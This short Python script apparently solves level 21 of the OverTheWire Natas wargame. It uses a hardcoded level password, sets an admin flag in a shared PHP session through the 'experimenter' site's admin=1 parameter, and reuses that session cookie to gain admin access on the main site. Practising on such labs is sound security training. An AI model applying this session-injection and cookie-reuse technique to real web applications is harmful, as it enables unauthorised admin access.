#!/bin/python
import requests,re

username = "natas21"
pwd = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"
url = f"http://{username}.natas.labs.overthewire.org/"
exp="http://natas21-experimenter.natas.labs.overthewire.org?submit&admin=1"
session = requests.Session()

response= session.get(exp,auth=(username,pwd))
ecookie=response.cookies['PHPSESSID']
print(ecookie)
cookie={'PHPSESSID':ecookie}

response2= requests.get(url,auth=(username,pwd),cookies=cookie)
print(response2.text)